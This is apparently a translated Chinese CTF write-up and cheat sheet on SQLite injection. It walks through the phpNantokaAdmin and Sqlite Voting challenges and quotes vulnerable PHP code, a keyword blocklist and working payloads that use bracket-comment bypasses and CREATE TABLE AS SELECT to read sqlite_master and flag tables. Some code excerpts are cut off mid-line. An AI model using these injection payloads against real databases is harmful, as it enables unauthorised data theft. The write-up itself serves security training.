# CTF中的SQLite总结Cheat Sheet
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 前言
几次比赛都遇到了 SQLite 注入的题目，所以想来具体总结一下 SQLite 到底有哪些利用点，并整理出一张 Cheat
Sheet。行文如有不当，还请师傅们在评论区留言捉虫，不甚感激。
## 0x02 初识
###  简介
SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite
直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL
数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定/默认数据库名/地址的问题，可下载造成安全威胁。
###  数据库判别
拿到一个环境首先做的应该是后端数据库的判别。
以下列出的是可供判别后端数据库的函数，在同一行并不意味着功能相同：
MYSQL | SQLite  
---|---  
@[@version](https://github.com/version "@version") / version() |
sqlite_version()  
connection_id() | last_insert_rowid()  
last_insert_id() | strftime(‘%s’,’now’);  
row_count() | .  
crc32(‘MySQL’) | .  
BINARY_CHECKSUM(123) | .  
## 0x03 题解
接下来通过两道题来理解 SQLite 的一些特性，方便我们后面总结 Cheat Sheet：
###  phpNantokaAdmin
路由 index、create、insert、delete ，功能对应显示、创建表、插入数据、删表。
先看有关 flag 的信息：
    $pdo->query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
    $pdo->query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
    $pdo->query($sql);
这是源码中创建完用户自定义的表后，使用 config.php 中定义好了的 `FLAG_TABLE` 、`FLAG_COLUMN`、`FLAG`
三个常量创建表，作为我们的 `target` 。
    $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name <> '" . FLAG_TABLE . "' LIMIT 1;");
当然，它不会就这么简单地显示在 index 页面中。
我们要做的就是通过自定义表利用可控变量达到注出 `FLAG_TABLE` 数据的目的。
index.php
      $table_name = (string) $_POST['table_name'];
      $columns = $_POST['columns'];
      //sqlite 创建表语句 sqlite3 database_name.db
      $filename = bin2hex(random_bytes(16)) . '.db';
      $pdo = new PDO('sqlite:db/' . $filename);
      if (!is_valid($table_name)) {
        flash('Table name contains dangerous characters.');
      }
      if (strlen($table_name)  [SQLite Keywords](https://www.sqlite.org/lang_keywords.html)
>
> SQLite 中使用关键字作为名称，有四种引用方法：
>
> 
>
> 括在方括号中的关键字是标识符。这不是标准的 SQL。MS access 和 SQL server 使用这种引用机制，SQLite
> 中包含这种引用机制是为了兼容。
>
> 
>
> 既然正则中所有引号都有匹配，我们可以使用 `[]` 括关键字进行绕过，并可用它来 **注释** ，代替 `--` 。
>
> MYSQL 中有 information_schema 这样的系统表方便注入查询，而 SQLite 有无？
>
> [sqlite_master](https://www.sqlite.org/schematab.html)
>
> 每个 SQLite 数据库都包含一个“模式表”
> ，用于存储该数据库的模式。数据库的模式是对数据库中包含的所有其他表、索引、触发器和视图的描述。模式表如下所示：
>
> 
>
> 其中 sql 字段的含义：
>
> Sqlite _ schema.SQL 列存储描述对象的 SQL 文本。此 SQL 文本是 CREATE TABLE、 CREATE VIRTUAL
> TABLE、 CREATE INDEX、 CREATE VIEW 或 CREATE TRIGGER
> 语句，如果在数据库文件为数据库连接的主数据库时对其进行计算，则将重新创建该对象。 **文本通常是用于创建对象的原始语句的副本。**
>
> 换而言之，我们可以通过查询 sqlite_master 中的 sql 知晓 `FLAG_TABLE` 创建时的语句，获取到其表名和列名。
>
> 综上，我们所要利用的有两张表，这就需要能操作两张表的，与 create table 有关的用法。
>
> [CREATE TABLE … AS SELECT
> Statements](https://www.sqlite.org/lang_createtable.html)
>
> “ CREATE TABLE… AS SELECT” 语句基于 SELECT 语句的结果创建并填充数据库表。该表的列数与 SELECT
> 语句返回的行数相同。每个列的名称与 SELECT 语句的结果集中相应列的名称相同。每个列的声明类型由 SELECT
> 语句结果集中相应表达式的表达式亲和类型确定。
>
> 使用 create table as 创建的表 **最初由 SELECT 语句返回的数据行填充** 。按照 SELECT 语句返回行的顺序，以连续升序的
> rowid 值 (从1开始) 进行分配。
由上，也就是说，我们能这样构造语句：
    CREATE TABLE landv as select sql [(dummy1 TEXT, dummy2 TEXT, `whatever you want` ] from sqlite_master;);
    --前面说过，[] 可用作注释，也就是说，上面语句等价为
    CREATE TABLE landv as select sql from sqlite_master;
    --landv 这张由用户创建的表就会被 select 语句返回的数据行填充
payload1：
    //路由 create 下 post
    table_name=landv as select sql [&columns[0][name]=abc&columns[0][type]=] from sqlite_master;
返回填充的第一行就是我们查出来的创建 `FLAG_TABLE` 的原始语句，同理，我们可以借此查出 flag 。
payload2：
    //路由 create 下 post
    table_name=landv as select flag_2a2d04c3 [&columns[0][name]=abc&columns[0][type]=] from flag_bf1811da;
这道题主要是面向创表过程中可能的注入，但实际中运用得少（没有权限），接下来我们看整体。
###  Sqlite Voting
给了数据库文件和部分源码。
vote.php
     \ _ ` ~ -        "[\"%'*+\\/\\\\_`~-]",
        // whitespace chars
        '\s',
        // dangerous functions
        'blob', 'load_extension', 'char', 'unicode',
        '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
        'in', 'limit', 'order', 'union', 'join'
      ];
      $regexp = '/' . implode('|', $banword) . '/i';
      if (preg_match($regexp, $str)) {
        return false;
      }
      return true;
    }
    header("Content-Type: text/json; charset=utf-8");
    // check user input
    if (!isset($_POST['id']) || empty($_POST['id'])) {
      die(json_encode(['error' => 'You must specify vote id']));
    }
    $id = $_POST['id'];
    if (!is_valid($id)) {
      die(json_encode(['error' => 'Vote id contains dangerous chars']));
    }
    // N.B
    // update database
    $pdo = new PDO('sqlite:../db/vote.db');
    $res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
    if ($res === false) {
      die(json_encode(['error' => 'An error occurred while updating database']));
    }
    // succeeded!
    echo json_encode([
      'message' => 'Thank you for your vote! The result will be published after the CTF finished.'
    ]);
schema.sql (actual flag is removed)
    DROP TABLE IF EXISTS `vote`;
    CREATE TABLE `vote` (
      `id` INTEGER PRIMARY KEY AUTOINCREMENT,
      `name` TEXT NOT NULL,
      `count` INTEGER
    );
    INSERT INTO `vote` (`name`, `count`) VALUES
      ('dog', 0),
      ('cat', 0),
      ('zebra', 0),
      ('koala', 0);
    DROP TABLE IF EXISTS `flag`;
    CREATE TABLE `flag` (
      `flag` TEXT NOT NULL
    );
    INSERT INTO `flag` VALUES ('HarekazeCTF{}');
过滤非常严格。
这道题的 SQL 语句是 update `vote` 表中的 `count` 自增，并且还会有更新是否成功的回显：
    if ($res === false) {
      die(json_encode(['error' => 'An error occurred while updating database']));
    }